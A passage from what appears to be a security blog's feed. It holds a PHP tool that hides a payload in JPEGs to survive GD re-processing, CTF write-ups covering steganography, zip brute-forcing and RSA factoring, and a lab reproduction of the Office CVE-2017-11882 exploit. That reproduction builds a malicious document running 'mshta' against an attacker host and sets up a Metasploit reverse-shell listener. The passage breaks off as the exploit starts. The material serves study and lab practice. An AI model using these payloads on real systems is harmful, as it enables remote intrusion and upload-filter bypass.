$startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="安装php-gd"><a href="#安装php-gd" class="headerlink" title="安装php-gd"></a>安装php-gd</h2><p><code>sudo apt-get install php-gd &amp;&amp; sudo service apache2 restart</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="php" scheme="https://threst.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>tjctf2018wp</title>
    <link href="https://threst.github.io/2018/10/04/tjctf2018misc/"/>
    <id>https://threst.github.io/2018/10/04/tjctf2018misc/</id>
    <published>2018-10-04T05:34:10.000Z</published>
    <updated>2018-10-04T07:22:32.380Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Trippy"><a href="#Trippy" class="headerlink" title="Trippy"></a>Trippy</h2><p><code>strings be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif | grep tjctf</code></p><h2 id="Interference"><a href="#Interference" class="headerlink" title="Interference"></a>Interference</h2><p>1.将v1和v2用stegsolve<code>add</code>下，保存图片，在改变图片的偏移量，找到黑白的二维码，用windows反色，扫描出flag<br>2.<code>compare v1.png v2.png output.png</code>再把output.png用stegsolve调至黑白，windows反色.</p><h2 id="Grid-Parser"><a href="#Grid-Parser" class="headerlink" title="Grid Parser"></a>Grid Parser</h2><ol><li>解压文件，发现有个<code>password.png</code>，用<code>binwalk</code>提取出zip，使用<code>fcrackzip --brute-force --charset a1 --length 1-3 --use-unzip xxxx.zip</code>，爆破出密码为<code>px</code></li></ol><h2 id="Weird-Logo"><a href="#Weird-Logo" class="headerlink" title="Weird Logo"></a>Weird Logo</h2><p>直接stegsolve</p><h2 id="Lexington-State-Bank"><a href="#Lexington-State-Bank" class="headerlink" title="Lexington State Bank"></a>Lexington State Bank</h2><p>安装zsteg<br><code>gem install zsteg</code><br>直接命令<code>zsteg lsb.png</code></p><h2 id="Huuuuuge"><a href="#Huuuuuge" class="headerlink" title="Huuuuuge"></a>Huuuuuge</h2><p>nmap扫描<br>结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-19 21:41 CST</span><br><span class="line">Nmap scan report for 226.187.154.104.bc.googleusercontent.com (104.154.187.226)</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">22/tcp   open   ssh</span><br><span class="line">80/tcp   closed http</span><br><span class="line">5901/tcp closed vnc-1</span><br><span class="line">9418/tcp open   git</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.20 seconds</span><br></pre></td></tr></table></figure></p><p>开放ssh和git，直接<code>git clone git://104.154.187.226/huuuuuge</code>失败，参考这个<a href="https://askubuntu.com/questions/460885/how-to-clone-git-repository-only-some-directories" target="_blank" rel="noopener">链接</a><br>用以下命令，正好题目说不要思考太深.<br><code>git clone --depth 1 git://104.154.187.226/huuuuuge</code></p><h2 id="RC4-took-an-L"><a href="#RC4-took-an-L" class="headerlink" title="RC4 took an L"></a>RC4 took an L</h2><p><a href="https://github.com/dstein64/LC4/blob/master/documentation.md" target="_blank" rel="noopener">https://github.com/dstein64/LC4/blob/master/documentation.md</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [1]: import lc4</span><br><span class="line"></span><br><span class="line">In [2]: key  = &quot;pq_xc589r3nb#mgjtkh7w2dlfvy4eaoi6uzs&quot;</span><br><span class="line"></span><br><span class="line">In [3]: encrypted = &quot;wpwt#5ng4_qbitp#8mq59r_g866c4t59c6vy6tisj4af6bprfnbd_wrq2wjmr4ld_s26a7i#biiyqjolq8lus_wfus</span><br><span class="line">   ...: fkj8xv2qrrv3etab_marovc#uuoueyl&quot;</span><br><span class="line"></span><br><span class="line">In [4]: decrypted = lc4.decrypt(key,encrypted)</span><br><span class="line"></span><br><span class="line">In [5]: print(decrypted)</span><br><span class="line">i_hope_that_by_making_this_long_you_will_assume_substitution_cipher_and_go_to_quip_qiup_the_flag_is#elsie_four_is_not_rc4</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Trippy&quot;&gt;&lt;a href=&quot;#Trippy&quot; class=&quot;headerlink&quot; title=&quot;Trippy&quot;&gt;&lt;/a&gt;Trippy&lt;/h2&gt;&lt;p&gt;&lt;code&gt;strings be37fef78cfd6c7deda71154f567e6d0cfefbda1
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯wp</title>
    <link href="https://threst.github.io/2018/10/04/%E7%BD%91%E9%BC%8E%E6%9D%AFwp/"/>
    <id>https://threst.github.io/2018/10/04/网鼎杯wp/</id>
    <published>2018-10-04T05:32:13.000Z</published>
    <updated>2018-10-04T07:22:29.818Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯wp"><a href="#网鼎杯wp" class="headerlink" title="网鼎杯wp"></a>网鼎杯wp</h2><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>打开文件看见很多图片,首先判断lsb,用工具zsteg,一张一张试，试到第六张<code>zsteg 6.png</code><br>出flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">imagedata           .. text: &quot;-+,554$&amp;&amp;&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. text: &quot;^;lI;bN$&quot;</span><br><span class="line">b1,bgr,lsb,xy       .. text: &quot;+flag&#123;03a253f5-8e93-4533-bcfc-af908830095d&#125;\nq&quot;</span><br><span class="line">b2,b,msb,xy         .. file: Encore - version 8432</span><br><span class="line">b4,r,lsb,xy         .. text: &quot;iEsx\&quot;gwN)&quot;</span><br><span class="line">b4,g,lsb,xy         .. text: &quot;yEsx\&quot;gwN)&quot;</span><br><span class="line">b4,b,msb,xy         .. text: &quot;&#123;OL?i9Ww&quot;</span><br></pre></td></tr></table></figure></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>首先求出q,p<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span><span class="params">(n,e,d)</span>:</span></span><br><span class="line">  p = <span class="number">1</span></span><br><span class="line">  q = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:</span><br><span class="line">    k = d * e - <span class="number">1</span></span><br><span class="line">    g = random.randint ( <span class="number">0</span> , n )</span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">      k /= <span class="number">2</span></span><br><span class="line">      y = pow(g,k,n)</span><br><span class="line">      <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:</span><br><span class="line">        p = gcd(y<span class="number">-1</span>,n)</span><br><span class="line">        q = n/p</span><br><span class="line">  <span class="keyword">return</span> p,q</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  n =<span class="number">365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357</span> </span><br><span class="line">  e = <span class="number">65537</span></span><br><span class="line">  d = <span class="number">171667543985758425014232627985840717336387122108163758500542139626729279212540485673813409388397427405892256280730752710530037468765259171638824687119216443453078833931370749271396524300663719786871097595637432285751800013612137436020725492852419342272435212733486026753609513054804440530485467017884797272879406284689903095072725307517165288748564887361729738358011463377509622604034612759898436024272853796444439505507110804160400608180412245257162062494766079887998276493727771202445125297118556385657613871902180087388189988280105656191733965985878495407148701887047735812018200868151321246119065258205755102189932618492331181731032930671506379119003614308043854723142913145153824556828017544028126772950732350030371733003652817854070184981540813302478821473998511699291112000260313162924676245915026226201977284465842505256191235822318812659628683043195357384607192367037650400361829016395922074065034014120534209020328864830006606839179592932609256661738193663329776230050481312159600570791315455079679469956882283489829258240404557309270261381865785081719442470884775430068193960751589033994677379472095235901602941733635505402949964622214247924792042997962235246007680923289071880896909708764598890244005005286926994431628289</span></span><br><span class="line">  p,q = getpq(n,e,d)</span><br><span class="line">  <span class="keyword">print</span> hex(p),hex(q)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></p><p>然后将enc保存起来为en文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">n = <span class="number">365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357</span></span><br><span class="line">q = <span class="number">21247215740957134093265550307601596334565934182288901633479787419858595507309542143291010899116196305518233534420568241312971809880837699847400521241640799368655041150575554308730271881769239094444859039192040949365669348829967204647597799647400611871600471392643211141324508902013965629910849583588860496396894218207070653018491227851599590460886901861118814380124225957234489558977546955544744088926474539812805322440263336981775000388601318263891815294818558967365443417213622344902893006222500539208416032217024199412011407065597780149434489493090516057515224711817526865207811206081845018578244352022299726352429</span></span><br><span class="line">p = <span class="number">17218660277747658661570321204242764803630206984608091050735513899954607259990197682920217962729554631925287717895042750367376053893825222669682720379767777978420372647078471394057423219108293122309702127813213538098587207320396013417905225613995163882055903136983578393368677405597005083234898687252223168153402377438770956193242614092327835450469896527227274247481162714635222596608814392174415700802919488373733075163465872659516094599061925501245246745540660613671330140533678955280470168225630164182057506377339944396256899408381867150087697255700045339651723565686838745271371156317781031620433061297464511939833</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = int(gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br><span class="line">c = <span class="number">595907910014897566676759273220494180110504405309206928262077375196851872198255475894354731091152236001815566589109149418500941957601976338444865345923284445575231525767013366811625019790193104404700935059348406110259409132999154793422284855871479573037198863168316139619015230842153164456415165712733168847053549666987429231550045602429647190887296150436097504253951033086041023290243394588112378415597355331197477353268041702315544498517593435582803377846605416492328428549762726997373778610297631262936044023082133389527010183648204602019909093544050106545010340111158865651714595416550877266379460461202508425081538939755155981052462387069127219471271252329219741973931444515475042747296537826297597609877185091023146800772255931184176842795811493106605043628420424570356086529035683658247137732622727936360278626896359520245649007121507751791963774871011757969835056581831379451191486773951068884218824708768124265822406883125206366165049254095060850508149142077001002691653724105471247840338330950732651135526020758912039445132132220384552395727000975811496722746325764235912590648009260905626046623587310131509221213855320504560598181447448347942432104726593025899197575968063366667049857458434444589861188997071804152577554008432377364384618217386050104523193905875708680446628674323881765587061198043253617150813946435891423000351453751011920626958050766691194569988935791651947014346084202733308461380228052483711867634858130530821103064974133728497007084932069068016812055942718671316269862791929104093268433719717198448532384887239504852113742140342891243245503616771575963935904547388496016245046067614357190925132118951805544371988522892491794366705168091658</span></span><br><span class="line">privatekey = rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"en"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(rsa.decrypt(base64.b64decode(f.read()),privatekey).decode())</span><br></pre></td></tr></table></figure></p><p>得到flag<br><code>flag{w3lC0M3_t0_rS4_w0RlD}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;网鼎杯wp&quot;&gt;&lt;a href=&quot;#网鼎杯wp&quot; class=&quot;headerlink&quot; title=&quot;网鼎杯wp&quot;&gt;&lt;/a&gt;网鼎杯wp&lt;/h2&gt;&lt;h2 id=&quot;套娃&quot;&gt;&lt;a href=&quot;#套娃&quot; class=&quot;headerlink&quot; title=&quot;套娃&quot;&gt;&lt;/a&gt;套
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-11882复现</title>
    <link href="https://threst.github.io/2018/09/18/cve-2017-11882/"/>
    <id>https://threst.github.io/2018/09/18/cve-2017-11882/</id>
    <published>2018-09-18T05:34:14.000Z</published>
    <updated>2018-09-18T05:42:35.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。 由于漏洞影响面较广，漏洞披露后，金睛安全研究团队持续对漏洞相关攻击事件进行关注。11月19日，监控到了已有漏洞POC在网上流传，随即迅速对相关样本进行了分析。目前该样本全球仅微软杀毒可以检测。</p><ul><li>漏洞影响版本：</li><li>Office 365</li><li>Microsoft Office 2000</li><li>Microsoft Office 2003</li><li>Microsoft Office 2007 Service Pack 3</li><li>Microsoft Office 2010 Service Pack 2</li><li>Microsoft Office 2013 Service Pack 1</li><li>Microsoft Office 2016</li></ul><h2 id="0x01-利用工具清单："><a href="#0x01-利用工具清单：" class="headerlink" title="0x01 利用工具清单："></a>0x01 利用工具清单：</h2><p>a) tcp反弹：kali 192.168.1.5<br>b) 安装office2016的系统：win7 192.168.1.7</p><h2 id="0x02-利用过程"><a href="#0x02-利用过程" class="headerlink" title="0x02 利用过程"></a>0x02 利用过程</h2><h3 id="下载poc"><a href="#下载poc" class="headerlink" title="下载poc"></a>下载poc</h3><p><a href="https://github.com/Ridter/CVE-2017-11882" target="_blank" rel="noopener">github</a></p><h3 id="生成msf利用的doc"><a href="#生成msf利用的doc" class="headerlink" title="生成msf利用的doc"></a>生成msf利用的doc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">threst@threst:~/Pentest/poc/CVE-2017-11882$ python Command43b_CVE-2017-11882.py -c &quot;mshta http://192.168.1.5:8080/abc&quot; -o cve.doc</span><br><span class="line">[*] Done ! output file --&gt; cve.doc</span><br><span class="line">threst@threst:~/Pentest/poc/CVE-2017-11882$ sudo cp cve.doc /var/www/html/</span><br></pre></td></tr></table></figure><h3 id="msf配置Poc："><a href="#msf配置Poc：" class="headerlink" title="msf配置Poc："></a>msf配置Poc：</h3><p>开启metasploit<br><code>msfconsole</code><br>使用11882模块<br><code>use exploit/windows/smb/cve-2017-11882</code><br>设置payload<br><code>set payload windows/meterpreter/reverse_tcp</code></p><p>设置选项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; set lhost 192.168.1.5</span><br><span class="line">lhost =&gt; 192.168.1.5</span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; set URIPATH abc</span><br><span class="line">URIPATH =&gt; abc</span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/cve-2017-11882):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8080             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH  abc              no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.5      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.5:4444 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/abc</span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; [*] Local IP: 